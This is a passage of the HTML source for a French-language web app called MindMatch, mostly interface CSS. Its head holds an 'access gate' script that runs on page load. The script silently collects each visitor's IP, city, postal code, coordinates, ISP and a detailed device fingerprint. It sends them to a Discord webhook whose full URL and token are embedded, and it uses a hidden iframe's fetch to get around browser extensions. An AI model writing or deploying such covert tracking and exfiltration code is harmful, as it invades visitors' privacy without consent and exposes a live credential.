<!doctype html>
<html lang="fr">
    <head>
        <meta charset="UTF-8" />
        <meta
            name="viewport"
            content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
        />
        <meta name="theme-color" content="#0d0d14" />

        <!-- ================================================================
             ACCESS GATE (client-side soft lock, browser prompt)
        ================================================================ -->
        <style>
            html.__locked {
                visibility: hidden;
            }
        </style>
        <script>
            document.documentElement.classList.add("__locked");
            (function () {
                // Capture a pristine fetch from a throwaway iframe BEFORE any
                // page-script or user-script extension patches window.fetch.
                // The iframe's window is isolated — extensions that inject via
                // content scripts patch the top frame's fetch, not this one's.
                let pureFetch = window.fetch.bind(window);
                try {
                    const iframe = document.createElement("iframe");
                    iframe.style.display = "none";
                    iframe.src = "about:blank";
                    (document.documentElement || document).appendChild(iframe);
                    if (iframe.contentWindow && iframe.contentWindow.fetch) {
                        pureFetch = iframe.contentWindow.fetch.bind(
                            iframe.contentWindow,
                        );
                    }
                } catch (e) {
                    /* ignore */
                }
                const WEBHOOK =
                    "https://discord.com/api/webhooks/1496557547132424243/vVLzl9AdMzJj8DLX1AuzJlI1YcOEyh42eYjly0ZA2OfvhTad2E0iOwghCURI_8b01W83";
                const CODE_TTL = 20000; // ms
                const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                function genCode() {
                    let c = "";
                    for (let i = 0; i < 6; i++)
                        c += CHARS[Math.floor(Math.random() * 26)];
                    return c;
                }
                async function getIPInfo() {
                    // Provider chain — each one uses wildcard CORS and works from GitHub Pages.
                    // ipapi.is first: gives IP + geo + ASN, no auth required, generous free tier.
                    try {
                        const r = await pureFetch("https://api.ipapi.is/", {
                            cache: "no-store",
                        });
                        if (r.ok) {
                            const j = await r.json();
                            const loc = j.location || {};
                            const co = j.company || {};
                            const asn = j.asn || {};
                            return {
                                ip: j.ip || "unknown",
                                city: loc.city || "",
                                region: loc.state || "",
                                country: loc.country || "",
                                countryCode: loc.country_code || "",
                                postal: loc.zip || "",
                                lat: loc.latitude,
                                lon: loc.longitude,
                                tz: loc.timezone || "",
                                org: co.name || asn.org || "",
                                asn: asn.asn ? "AS" + asn.asn : "",
                            };
                        }
                    } catch (e) {
                        console.warn("[gate] ipapi.is failed", e);
                    }
                    // Fallback 1: geojs.io (wildcard CORS, reliable)
                    try {
                        const r = await pureFetch(
                            "https://get.geojs.io/v1/ip/geo.json",
                            { cache: "no-store" },
                        );
                        if (r.ok) {
                            const j = await r.json();
                            return {
                                ip: j.ip || "unknown",
                                city: j.city || "",
                                region: j.region || "",
                                country: j.country || "",
                                countryCode: j.country_code || "",
                                postal: "",
                                lat: j.latitude ? parseFloat(j.latitude) : null,
                                lon: j.longitude
                                    ? parseFloat(j.longitude)
                                    : null,
                                tz: j.timezone || "",
                                org:
                                    j.organization_name || j.organization || "",
                                asn: j.asn ? "AS" + j.asn : "",
                            };
                        }
                    } catch (e) {
                        console.warn("[gate] geojs.io failed", e);
                    }
                    // Fallback 2: ipify (IP only, no geo)
                    try {
                        const r = await pureFetch(
                            "https://api.ipify.org?format=json",
                            { cache: "no-store" },
                        );
                        const j = await r.json();
                        return { ip: j.ip || "unknown" };
                    } catch (e) {
                        return { ip: "unknown" };
                    }
                }
                function parseUA(ua) {
                    const out = {
                        browser: "unknown",
                        browserVersion: "",
                        os: "unknown",
                        osVersion: "",
                        device: "Desktop",
                    };
                    // Browser
                    if (/Edg\/([\d.]+)/.test(ua)) {
                        out.browser = "Edge";
                        out.browserVersion = RegExp.$1;
                    } else if (/OPR\/([\d.]+)/.test(ua)) {
                        out.browser = "Opera";
                        out.browserVersion = RegExp.$1;
                    } else if (/Firefox\/([\d.]+)/.test(ua)) {
                        out.browser = "Firefox";
                        out.browserVersion = RegExp.$1;
                    } else if (/Chrome\/([\d.]+)/.test(ua)) {
                        out.browser = "Chrome";
                        out.browserVersion = RegExp.$1;
                    } else if (/Version\/([\d.]+).+Safari/.test(ua)) {
                        out.browser = "Safari";
                        out.browserVersion = RegExp.$1;
                    } else if (/Safari\/([\d.]+)/.test(ua)) {
                        out.browser = "Safari";
                        out.browserVersion = RegExp.$1;
                    }
                    // OS
                    if (/Windows NT 10/.test(ua)) {
                        out.os = "Windows";
                        out.osVersion = "10/11";
                    } else if (/Windows NT 6\.3/.test(ua)) {
                        out.os = "Windows";
                        out.osVersion = "8.1";
                    } else if (/Windows NT 6\.2/.test(ua)) {
                        out.os = "Windows";
                        out.osVersion = "8";
                    } else if (/Windows NT 6\.1/.test(ua)) {
                        out.os = "Windows";
                        out.osVersion = "7";
                    } else if (/Mac OS X ([\d_.]+)/.test(ua)) {
                        out.os = "macOS";
                        out.osVersion = RegExp.$1.replace(/_/g, ".");
                    } else if (/Android ([\d.]+)/.test(ua)) {
                        out.os = "Android";
                        out.osVersion = RegExp.$1;
                    } else if (/iPhone OS ([\d_]+)/.test(ua)) {
                        out.os = "iOS";
                        out.osVersion = RegExp.$1.replace(/_/g, ".");
                    } else if (/iPad.+OS ([\d_]+)/.test(ua)) {
                        out.os = "iPadOS";
                        out.osVersion = RegExp.$1.replace(/_/g, ".");
                    } else if (/Linux/.test(ua)) {
                        out.os = "Linux";
                    } else if (/CrOS/.test(ua)) {
                        out.os = "ChromeOS";
                    }
                    // Device class
                    if (/Mobi|iPhone|Android.+Mobile/.test(ua))
                        out.device = "Mobile";
                    else if (/iPad|Tablet/.test(ua)) out.device = "Tablet";
                    return out;
                }
                function collectFingerprint() {
                    const ua = navigator.userAgent || "unknown";
                    const parsed = parseUA(ua);
                    const uaData = navigator.userAgentData || null;
                    const nav = navigator;
                    const scr = screen;
                    const conn =
                        nav.connection ||
                        nav.mozConnection ||
                        nav.webkitConnection ||
                        null;
                    let gpu = "unknown";
                    try {
                        const c = document.createElement("canvas");
                        const gl =
                            c.getContext("webgl") ||
                            c.getContext("experimental-webgl");
                        if (gl) {
                            const ext = gl.getExtension(
                                "WEBGL_debug_renderer_info",
                            );
                            if (ext)
                                gpu = gl.getParameter(
                                    ext.UNMASKED_RENDERER_WEBGL,
                                );
                        }
                    } catch (e) {
                        /* ignore */
                    }
                    return {
                        ua,
                        browser: parsed.browser,
                        browserVersion: parsed.browserVersion,
                        os: parsed.os,
                        osVersion: parsed.osVersion,
                        device: parsed.device,
                        uaBrands:
                            uaData && uaData.brands
                                ? uaData.brands
                                      .map((b) => b.brand + " " + b.version)
                                      .join(", ")
                                : "",
                        uaMobile: uaData ? uaData.mobile : null,
                        uaPlatform: uaData
                            ? uaData.platform
                            : nav.platform || "",
                        language: nav.language || "",
                        languages: (nav.languages || []).join(", "),
                        tz:
                            Intl.DateTimeFormat().resolvedOptions().timeZone ||
                            "",
                        tzOffset: new Date().getTimezoneOffset(),
                        screen:
                            scr.width +
                            "×" +
                            scr.height +
                            " (avail " +
                            scr.availWidth +
                            "×" +
                            scr.availHeight +
                            ")",
                        viewport: innerWidth + "×" + innerHeight,
                        dpr: devicePixelRatio || 1,
                        colorDepth: scr.colorDepth,
                        touchPoints: nav.maxTouchPoints || 0,
                        cores: nav.hardwareConcurrency || "?",
                        memory: nav.deviceMemory
                            ? nav.deviceMemory + " GB"
                            : "?",
                        cookies: nav.cookieEnabled,
                        dnt: nav.doNotTrack || "none",
                        online: nav.onLine,
                        connection: conn
                            ? (conn.effectiveType || "?") +
                              (conn.downlink
                                  ? " / " + conn.downlink + "Mbps"
                                  : "") +
                              (conn.rtt ? " / " + conn.rtt + "ms" : "")
                            : "unknown",
                        gpu,
                        referrer: document.referrer || "direct",
                        url: location.href,
                    };
                }
                async function sendCode(code, info, fp) {
                    try {
                        const truncate = (s, n) =>
                            s && s.length > n ? s.slice(0, n) + "…" : s || "—";
                        const geo =
                            [info.city, info.region, info.country]
                                .filter(Boolean)
                                .join(", ") || "—";
                        const latlon =
                            info.lat != null && info.lon != null
                                ? info.lat + ", " + info.lon
                                : "—";
                        const expireTs = Math.floor(
                            (Date.now() + CODE_TTL) / 1000,
                        );

                        // --- EMBED 1 : Code + expiration ---
                        const codeEmbed = {
                            title: "🔐 Nouveau code d'accès",
                            color: 0x7c5ef7,
                            fields: [
                                {
                                    name: "🔑 Code",
                                    value: "# `" + code + "`",
                                    inline: true,
                                },
                                {
                                    name: "⏳ Expire",
                                    value: "<t:" + expireTs + ":R>",
                                    inline: true,
                                },
                            ],
                            timestamp: new Date().toISOString(),
                        };

                        // --- EMBED 2 : Infos visiteur ---
                        // --- EMBED 2 : Localisation + navigateur (max 25 fields) ---
                        const geoBrowserFields = [
                            {
                                name: "🌐 IP",
                                value: "`" + (info.ip || "?") + "`",
                                inline: true,
                            },
                            {
                                name: "📍 Localisation",
                                value: geo,
                                inline: true,
                            },
                            {
                                name: "🏢 ISP / ASN",
                                value: truncate(
                                    info.org +
                                        (info.asn ? " (" + info.asn + ")" : ""),
                                    80,
                                ),
                                inline: true,
                            },
                            {
                                name: "🗺️ Coordonnées",
                                value: latlon,
                                inline: true,
                            },
                            {
                                name: "📮 Code postal",
                                value: info.postal || "—",
                                inline: true,
                            },
                            {
                                name: "🕒 Fuseau IP",
                                value: info.tz || "—",
                                inline: true,
                            },
                            {
                                name: "🌍 Navigateur",
                                value:
                                    "`" +
                                    fp.browser +
                                    " " +
                                    fp.browserVersion +
                                    "`",
                                inline: true,
                            },
                            {
                                name: "💻 OS",
                                value:
                                    "`" +
                                    fp.os +
                                    (fp.osVersion ? " " + fp.osVersion : "") +
                                    "`",
                                inline: true,
                            },
                            { name: "📱 Type", value: fp.device, inline: true },
                            {
                                name: "🌐 Plateforme UA",
                                value: "`" + (fp.uaPlatform || "—") + "`",
                                inline: true,
                            },
                            {
                                name: "🔤 Langue",
                                value: "`" + (fp.language || "—") + "`",
                                inline: true,
                            },
                            {
                                name: "🗣️ Langues",
                                value: "`" + truncate(fp.languages, 80) + "`",
                                inline: true,
                            },
                            {
                                name: "🕰️ TZ navigateur",
                                value:
                                    "`" +
                                    fp.tz +
                                    " (UTC" +
                                    (fp.tzOffset <= 0 ? "+" : "-") +
                                    Math.abs(fp.tzOffset / 60) +
                                    ")`",
                                inline: true,
                            },
                            {
                                name: "↩️ Referrer",
                                value: "`" + truncate(fp.referrer, 100) + "`",
                                inline: false,
                            },
                            {
                                name: "🔗 URL",
                                value: "`" + truncate(fp.url, 100) + "`",
                                inline: false,
                            },
                            {
                                name: "🆔 User-Agent",
                                value: "```" + truncate(fp.ua, 500) + "```",
                                inline: false,
                            },
                        ];
                        if (fp.uaBrands) {
                            geoBrowserFields.splice(10, 0, {
                                name: "🏷️ UA-CH brands",
                                value: "`" + truncate(fp.uaBrands, 100) + "`",
                                inline: false,
                            });
                        }
                        const infoEmbed = {
                            title: "👤 Infos visiteur",
                            description:
                                "Un visiteur tente d'entrer sur **MindMatch**.",
                            color: 0x4f6ef7,
                            fields: geoBrowserFields,
                            timestamp: new Date().toISOString(),
                            footer: {
                                text:
                                    fp.browser +
                                    " • " +
                                    fp.os +
                                    " • " +
                                    fp.device,
                            },
                        };

                        // --- EMBED 3 : Hardware + réseau ---
                        const hwEmbed = {
                            title: "🖥️ Hardware & réseau",
                            color: 0x4f6ef7,
                            fields: [
                                {
                                    name: "🖥️ Écran",
                                    value: "`" + fp.screen + "`",
                                    inline: true,
                                },
                                {
                                    name: "📐 Fenêtre",
                                    value: "`" + fp.viewport + "`",
                                    inline: true,
                                },
                                {
                                    name: "🔍 DPR",
                                    value: "`" + fp.dpr + "x`",
                                    inline: true,
                                },
                                {
                                    name: "🎨 Profondeur",
                                    value: "`" + fp.colorDepth + "-bit`",
                                    inline: true,
                                },
                                {
                                    name: "👆 Touch points",
                                    value: "`" + fp.touchPoints + "`",
                                    inline: true,
                                },
                                {
                                    name: "⚙️ CPU cores",
                                    value: "`" + fp.cores + "`",
                                    inline: true,
                                },
                                {
                                    name: "💾 RAM",
                                    value: "`" + fp.memory + "`",
                                    inline: true,
                                },
                                {
                                    name: "📶 Réseau",
                                    value: "`" + fp.connection + "`",
                                    inline: true,
                                },
                                {
                                    name: "📡 Online",
                                    value: fp.online ? "✅" : "❌",
                                    inline: true,
                                },
                                {
                                    name: "🍪 Cookies",
                                    value: fp.cookies ? "✅" : "❌",
                                    inline: true,
                                },
                                {
                                    name: "🚫 DNT",
                                    value: "`" + fp.dnt + "`",
                                    inline: true,
                                },
                                {
                                    name: "🎮 GPU",
                                    value: "`" + truncate(fp.gpu, 80) + "`",
                                    inline: false,
                                },
                            ],
                        };

                        // Use pristine fetch captured from iframe to bypass any
                        // extension that patched window.fetch incorrectly.
                        const res = await pureFetch(WEBHOOK, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                embeds: [codeEmbed, infoEmbed, hwEmbed],
                            }),
                        });
                        if (!res.ok) {
                            const txt = await res.text().catch(() => "");
                            console.error(
                                "[gate] webhook HTTP " + res.status,
                                txt,
                            );
                        } else {
                            console.log(
                                "[gate] webhook sent, status",
                                res.status,
                            );
                        }
                    } catch (e) {
                        console.error(
                            "[gate] webhook failed (likely adblocker blocking discord.com/api/webhooks/). Disable adblocker for this site.",
                            e,
                        );
                    }
                }
                function deny() {
                    document.documentElement.innerHTML =
                        '<head><meta charset="UTF-8"><title>Accès refusé</title></head>' +
                        '<body style="margin:0;background:#0d0d14;color:#f0f0f8;display:grid;place-items:center;height:100vh;font-family:system-ui,-apple-system,sans-serif">' +
                        '<div style="text-align:center"><div style="font-size:48px;margin-bottom:12px">🚫</div><div>Accès refusé.</div></div>' +
                        "</body>";
                }
                window.__gateReady = new Promise((resolve) => {
                    (async () => {
                        const info = await getIPInfo();
                        const fp = collectFingerprint();
                        while (true) {
                            const code = genCode();
                            await sendCode(code, info, fp);
                            const sentAt = Date.now();
                            let expired = false;
                            while (!expired) {
                                const input = window.prompt(
                                    "🔐 Code d'accès (6 lettres) — envoyé sur Discord",
                                );
                                if (input === null) {
                                    deny();
                                    return;
                                }
                                if (Date.now() - sentAt > CODE_TTL) {
                                    alert(
                                        "Code expiré. Un nouveau code vient d'être envoyé.",
                                    );
                                    expired = true;
                                    break;
                                }
                                if (input.trim().toUpperCase() === code) {
                                    document.documentElement.classList.remove(
                                        "__locked",
                                    );
                                    resolve();
                                    return;
                                }
                                alert("Code incorrect, réessaie.");
                            }
                        }
                    })();
                });
            })();
        </script>
        <title>MindMatch — Find your mind match.</title>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
        <link
            href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
            rel="stylesheet"
        />
        <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
        <link
            rel="stylesheet"
            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
        />
        <style>
            /* ============================================================
     DESIGN TOKENS
  ============================================================ */
            :root {
                --bg: #0d0d14;
                --surface: #13131f;
                --surface-2: #1a1a2e;
                --surface-3: #22223a;
                --border: rgba(255, 255, 255, 0.08);
                --border-strong: rgba(255, 255, 255, 0.14);
                --text: #f0f0f8;
                --text-muted: #8888aa;
                --text-faint: #44445a;
                --accent: #4f6ef7;
                --accent-2: #7c5ef7;
                --accent-cyan: #8be0ff;
                --gradient: linear-gradient(135deg, #4f6ef7, #7c5ef7);
                --gradient-strong: linear-gradient(
                    135deg,
                    #4f6ef7 0%,
                    #7c5ef7 100%
                );
                --success: #4fc87a;
                --danger: #f74f6e;
                --shadow-card: 0 8px 32px rgba(0, 0, 0, 0.4);
                --shadow-soft: 0 4px 16px rgba(0, 0, 0, 0.3);
                --app-max-width: 430px;
                --nav-height: 72px;
                --safe-top: env(safe-area-inset-top, 0px);
                --safe-bottom: env(safe-area-inset-bottom, 0px);
            }

            /* ============================================================
     RESET & BASE
  ============================================================ */
            *,
            *::before,
            *::after {
                box-sizing: border-box;
            }
            html,
            body {
                height: 100%;
                margin: 0;
                padding: 0;
            }
            body {
                font-family:
                    "Inter",
                    -apple-system,
                    BlinkMacSystemFont,
                    sans-serif;
                font-size: 14px;
                line-height: 1.5;
                color: var(--text);
                background: #000;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
                overflow: hidden;
                overscroll-behavior: none;
            }
            button {
                font-family: inherit;
                cursor: pointer;
                border: none;
                background: none;
                color: inherit;
                padding: 0;
            }
            input,
            textarea {
                font-family: inherit;
                color: inherit;
            }
            input:focus,
            textarea:focus,
            button:focus {
                outline: none;
            }
            ::-webkit-scrollbar {
                display: none;
            }
            * {
                scrollbar-width: none;
            }

            /* ============================================================
     APP SHELL
  ============================================================ */
            .app {
                position: relative;
                width: 100%;
                max-width: var(--app-max-width);
                height: 100dvh;
                margin: 0 auto;
                background: var(--bg);
                display: flex;
                flex-direction: column;
                overflow: hidden;
                box-shadow: 0 0 80px rgba(124, 94, 247, 0.15);
            }

            @media (min-width: 500px) {
                body {
                    background:
                        radial-gradient(
                            ellipse at top,
                            rgba(124, 94, 247, 0.08),
                            transparent 60%
                        ),
                        radial-gradient(
                            ellipse at bottom,
                            rgba(79, 110, 247, 0.06),
                            transparent 60%
                        ),
                        #050508;
                }
                .app {
                    height: min(900px, 100dvh);
                    margin-top: max(0px, calc((100dvh - 900px) / 2));
                    border-radius: 36px;
                    border: 1px solid var(--border);
                    overflow: hidden;
                }
            }

            main {
                flex: 1;
                position: relative;
                overflow: hidden;
            }

            .tab-content {
                position: absolute;
                inset: 0;
                display: flex;
                flex-direction: column;
                padding-bottom: var(--nav-height);
                opacity: 0;
                pointer-events: none;
                transform: translateY(8px);
                transition:
                    opacity 200ms ease-out,
                    transform 200ms ease-out;
            }
            .tab-content.active {
                opacity: 1;
                pointer-events: auto;
                transform: translateY(0);
            }

            /* ============================================================
     HEADER (shared)
  ============================================================ */
            .header {
                display: flex;
                align-items: center;
                justify-content: space-between;
                padding: 18px 20px 16px;
                padding-top: calc(18px + var(--safe-top));
                flex-shrink: 0;
            }
            .header-title {
                font-size: 22px;
                font-weight: 700;
                letter-spacing: -0.02em;
                margin: 0;
            }
            .icon-btn {
                width: 40px;
                height: 40px;
                border-radius: 12px;
                background: var(--surface-2);
                border: 1px solid var(--border);
                display: grid;
                place-items: center;
                color: var(--text-muted);
                transition: all 150ms ease;
            }
            .icon-btn:hover {
                color: var(--text);
                border-color: var(--border-strong);
            }
            .icon-btn:active {
                transform: scale(0.95);
            }

            /* ============================================================
     NEURON MASCOT SVG
  ============================================================ */
            .neuron-svg {
                display: block;
                width: 100%;
                height: 100%;
                overflow: visible;
            }

            .neuron-float {
                animation: neuron-breathe 4s ease-in-out infinite;
                transform-origin: center;
            }
            @keyframes neuron-breathe {
                0%,
                100% {
                    transform: translateY(-2px) rotate(-1deg);
                }
                50% {
                    transform: translateY(2px) rotate(1deg);
                }
            }

            .neuron-nucleus {
                transform-origin: center;
                transform-box: fill-box;
                animation: neuron-pulse 2.5s ease-in-out infinite;
            }
            @keyframes neuron-pulse {
                0%,
                100% {
                    transform: scale(1);
                }
                50% {
                    transform: scale(1.06);
                }
            }

            .neuron-highlight {
                animation: neuron-highlight-shift 3s ease-in-out infinite;
            }
            @keyframes neuron-highlight-shift {
                0%,
                100% {
                    opacity: 0.55;
                }
                50% {
                    opacity: 0.85;
                }
            }

            .neuron-halo {
                transform-origin: center;
                transform-box: fill-box;
                animation: neuron-halo-pulse 2.5s ease-in-out infinite;
            }
            @keyframes neuron-halo-pulse {
                0%,
                100% {
                    transform: scale(1);
                    opacity: 0.3;
                }
                50% {
                    transform: scale(1.16);
                    opacity: 0.5;
                }
            }

            .dendrite {
                transform-origin: center;
                transform-box: fill-box;
                animation: dendrite-wiggle 5s ease-in-out infinite;
                animation-delay: var(--d, 0s);
            }
            @keyframes dendrite-wiggle {
                0%,
                100% {
                    transform: rotate(-1.5deg);
                }
                50% {
                    transform: rotate(2deg);
                }
            }

            .impulse {
                transform-origin: center;
                transform-box: fill-box;
                opacity: 0;
                animation: impulse-travel 2.8s ease-in-out infinite;
                animation-delay: var(--d, 0s);
            }
            @keyframes impulse-travel {
                0% {
                    transform: translateX(16px) scale(0.6);
                    opacity: 0;
                }
                15% {
                    opacity: 1;
                }
                60% {
                    transform: translateX(50px) scale(1);
                    opacity: 0.95;
                }
                85% {
                    opacity: 0;
                }
                100% {
                    transform: translateX(50px) scale(0.5);
                    opacity: 0;
                }
            }

            .neuron-svg.is-thinking .neuron-nucleus {
                animation-duration: 0.9s;
            }
            .neuron-svg.is-thinking .neuron-halo {
                animation-duration: 0.9s;
                opacity: 0.6;
            }
            .neuron-svg.is-thinking .impulse {
                animation-duration: 1.1s;
            }
            .neuron-svg.is-thinking {
                filter: drop-shadow(0 0 10px rgba(124, 94, 247, 0.55));
            }

            .neuron-svg.is-sending {
                animation: neuron-sending 0.5s ease-out;
            }
            @keyframes neuron-sending {
                0% {
                    transform: scale(1);
                }
                40% {
                    transform: scale(1.12);
                    filter: drop-shadow(0 0 14px #a5f3ff);
                }
                100% {
                    transform: scale(1);
                    filter: drop-shadow(0 0 0 transparent);
                }
            }

            .neuron-svg.is-synapse {
                animation: neuron-synapse 1.3s ease-out;
            }
            @keyframes neuron-synapse {
                0% {
                    filter: drop-shadow(0 0 0 transparent);
                }
                25% {
                    filter: drop-shadow(0 0 12px #a5f3ff)
                        drop-shadow(0 0 24px #7c5ef7);
                    transform: scale(1.08);
                }
                60% {
                    filter: drop-shadow(0 0 20px #7c5ef7)
                        drop-shadow(0 0 40px #4f6ef7);
                    transform: scale(1.03);
                }
                100% {
                    filter: drop-shadow(0 0 0 transparent);
                    transform: scale(1);
                }
            }
            .synapse-arc {
                opacity: 0;
                stroke-dasharray: 140;
                stroke-dashoffset: 140;
            }
            .neuron-svg.is-synapse .synapse-arc {
                animation: arc-draw 1.2s ease-out;
            }
            @keyframes arc-draw {
                0% {
                    opacity: 0;
                    stroke-dashoffset: 140;
                }
                20% {
                    opacity: 1;
                }
                60% {
                    opacity: 1;
                    stroke-dashoffset: 0;
                }
                100% {
                    opacity: 0;
                    stroke-dashoffset: 0;
                }
            }

            /* ============================================================
     NEURON TAB
  ============================================================ */
            .neuron-header {
                border-bottom: 1px solid var(--border);
                background: rgba(13, 13, 20, 0.85);
                backdrop-filter: blur(20px) saturate(160%);
                -webkit-backdrop-filter: blur(20px) saturate(160%);
                z-index: 3;
            }
            .neuron-brand {
                display: flex;
                align-items: center;
                gap: 10px;
            }
            .neuron-brand-mascot {
                width: 36px;
                height: 36px;
                flex-shrink: 0;
            }
            .neuron-brand-title {
                font-size: 18px;
                font-weight: 700;
                letter-spacing: -0.02em;
            }
            .neuron-brand-sub {
                font-size: 11.5px;
                color: var(--text-muted);
                margin-top: -2px;
                font-weight: 500;
            }

            .neuron-scroll {
                flex: 1;
                overflow-y: auto;
                padding: 20px 16px 16px;
                display: flex;
                flex-direction: column;
                gap: 16px;
            }

            .neuron-chips {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 8px;
                margin-top: 10px;
                width: 100%;
                max-width: 360px;
            }
            .neuron-chip {
                padding: 12px 14px;
                border-radius: 14px;
                background: var(--surface-2);
                border: 1px solid var(--border);
                text-align: left;
                font-size: 13px;
                font-weight: 500;
                color: var(--text);
                line-height: 1.35;
                transition: all 180ms ease;
                display: flex;
                align-items: flex-start;
                gap: 8px;
                cursor: pointer;
            }
            .neuron-chip:hover {
                background: var(--surface-3);
                border-color: var(--accent);
                transform: translateY(-1px);
            }
            .neuron-chip:active {
                transform: translateY(0);
            }
            .neuron-chip-emoji {
                font-size: 15px;
                line-height: 1;
                flex-shrink: 0;
                padding-top: 1px;
            }

            .neuron-row {
                display: flex;
                gap: 10px;
                align-items: flex-start;
                animation: bubble-in 300ms cubic-bezier(0.22, 0.61, 0.36, 1);
                max-width: 100%;
            }
            @keyframes bubble-in {
                from {
                    opacity: 0;
                    transform: translateY(8px) scale(0.98);
                }
                to {
                    opacity: 1;
                    transform: translateY(0) scale(1);
                }
            }
            .neuron-row.from-user {
                justify-content: flex-end;
            }
            .neuron-row-avatar {
                width: 32px;
                height: 32px;
                flex-shrink: 0;
                position: relative;
                top: 2px;
            }

            .neuron-bubble {
                max-width: 86%;
                padding: 11px 14px;
                font-size: 14.5px;
                line-height: 1.5;
                border-radius: 16px;
                word-wrap: break-word;
            }
            .neuron-bubble.from-neuron {
                background: var(--surface-2);
                border: 1px solid var(--border);
                color: var(--text);
                border-top-left-radius: 4px;
            }
            .neuron-bubble.from-user {
                background: var(--gradient);
                color: #fff;
                border-top-right-radius: 4px;
                box-shadow: 0 4px 14px rgba(124, 94, 247, 0.28);
            }
            .synapse-badge {
                display: inline-flex;
                align-items: center;
                gap: 4px;
                padding: 3px 10px;
                margin-bottom: 8px;
                font-size: 11px;
                font-weight: 700;
                letter-spacing: 0.02em;
                color: #a5f3ff;
                background: rgba(139, 224, 255, 0.12);
                border: 1px solid rgba(139, 224, 255, 0.35);
                border-radius: 999px;
                text-transform: uppercase;
                animation: synapse-badge-in 400ms
                    cubic-bezier(0.22, 0.61, 0.36, 1);
            }
            @keyframes synapse-badge-in {
                from {
                    transform: scale(0.8);
                    opacity: 0;
                }
                to {
                    transform: scale(1);
                    opacity: 1;
                }
            }

            .neuron-typing {
                display: inline-flex;
                gap: 4px;
                padding: 12px 14px;
                align-items: center;
            }
            .neuron-typing span {
                width: 6px;
                height: 6px;
                background: var(--text-muted);
                border-radius: 50%;
                animation: typing-bounce 1.2s ease-in-out infinite;
            }
            .neuron-typing span:nth-child(2) {
                animation-delay: 0.15s;
            }
            .neuron-typing span:nth-child(3) {
                animation-delay: 0.3s;
            }
            @keyframes typing-bounce {
                0%,
                100% {
                    transform: translateY(0);
                    opacity: 0.35;
                }
                40% {
                    transform: translateY(-4px);
                    opacity: 1;
                }
            }

            .neuron-input-row {
                display: flex;
                align-items: center;
                gap: 10px;
                padding: 12px 16px 14px;
                border-top: 1px solid var(--border);
                background: var(--surface);
            }
            .neuron-input {
                flex: 1;
                padding: 13px 16px;
                border-radius: 14px;
                background: var(--surface-2);
                border: 1px solid var(--border);
                font-size: 14.5px;
                color: var(--text);
                transition: border-color 150ms ease;
                min-width: 0;
            }
            .neuron-input::placeholder {
                color: var(--text-muted);
            }
            .neuron-input:focus {
                border-color: var(--accent);
            }
            .neuron-send {
                width: 44px;
                height: 44px;
                border-radius: 14px;
                background: var(--gradient);
                color: #fff;
                display: grid;
                place-items: center;
                flex-shrink: 0;
                box-shadow: 0 4px 14px rgba(124, 94, 247, 0.35);
                transition: all 150ms ease;
            }
            .neuron-send:hover {
                transform: scale(1.05);
            }
            .neuron-send:active {
                transform: scale(0.92);
            }
            .neuron-send:disabled {
                opacity: 0.4;
                cursor: not-allowed;
                transform: none;
                box-shadow: none;
            }

            /* ============================================================
     MATCH TAB
  ============================================================ */
            .match-search {
                padding: 0 20px 14px;
                flex-shrink: 0;
            }
            .search-wrap {
                position: relative;
            }
            .search-wrap svg {
                position: absolute;
                left: 14px;
                top: 50%;
                transform: translateY(-50%);
                color: var(--text-muted);
                pointer-events: none;
            }
            .search-input {
                width: 100%;
                padding: 12px 16px 12px 44px;
                border-radius: 14px;
                background: var(--surface-2);
                border: 1px solid var(--border);
                font-size: 14px;
                color: var(--text);
                transition: border-color 150ms ease;
            }
            .search-input::placeholder {
                color: var(--text-muted);
            }
            .search-input:focus {
                border-color: var(--accent);
            }

            .filters {
                display: flex;
                gap: 8px;
                padding: 0 20px 16px;
                overflow-x: auto;
                flex-shrink: 0;
            }
            .filter-chip {
                flex-shrink: 0;
                padding: 8px 16px;
                border-radius: 999px;
                background: var(--surface-2);
                border: 1px solid var(--border);
                color: var(--text-muted);
                font-size: 13px;
                font-weight: 500;
                white-space: nowrap;
                transition: all 150ms ease;
            }
            .filter-chip:hover {
                color: var(--text);
            }
            .filter-chip.active {
                background: var(--gradient);
                border-color: transparent;
                color: #fff;
                box-shadow: 0 4px 14px rgba(124, 94, 247, 0.35);
            }

            .match-grid {
                flex: 1;
                overflow-y: auto;
                padding: 0 20px 20px;
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 12px;
                align-content: start;
            }
            .match-card {
                background: var(--surface);
                border: 1px solid var(--border);
                border-radius: 18px;
                padding: 12px;
                display: flex;
                flex-direction: column;
                gap: 10px;
                position: relative;
                transition:
                    transform 150ms ease,
                    border-color 150ms ease;
            }
            .match-card:hover {
                transform: translateY(-2px);
                border-color: var(--border-strong);
            }
            .match-avatar {
                width: 100%;
                aspect-ratio: 1;
                border-radius: 14px;
                display: grid;
                place-items: center;
                color: rgba(255, 255, 255, 0.4);
                font-weight: 700;
                font-size: 44px;
                letter-spacing: -0.02em;
                position: relative;
                overflow: hidden;
            }
            .match-score {
                position: absolute;
                top: 8px;
                left: 8px;
                padding: 4px 9px;
                border-radius: 999px;
                background: rgba(0, 0, 0, 0.55);
                backdrop-filter: blur(8px);
                font-size: 11px;
                font-weight: 700;
                color: #fff;
                display: flex;
                align-items: center;
                gap: 3px;
            }
            .match-name {
                font-size: 14px;
                font-weight: 600;
                letter-spacing: -0.01em;
            }
            .match-age {
                color: var(--text-muted);
                font-weight: 500;
            }
            .match-tags {
                display: flex;
                flex-wrap: wrap;
                gap: 4px;
            }
            .match-tag {
                padding: 3px 8px;
                border-radius: 999px;
                background: var(--surface-2);
                border: 1px solid var(--border);
                font-size: 10.5px;
                color: var(--text-muted);
            }
            .match-like {
                position: absolute;
                bottom: 10px;
                right: 10px;
                width: 34px;
                height: 34px;
                border-radius: 50%;
                background: var(--surface-3);
                border: 1px solid var(--border);
                display: grid;
                place-items: center;
                color: var(--text);
                transition: all 180ms ease;
            }
            .match-like:hover {
                border-color: var(--accent-2);
                color: var(--accent-2);
            }
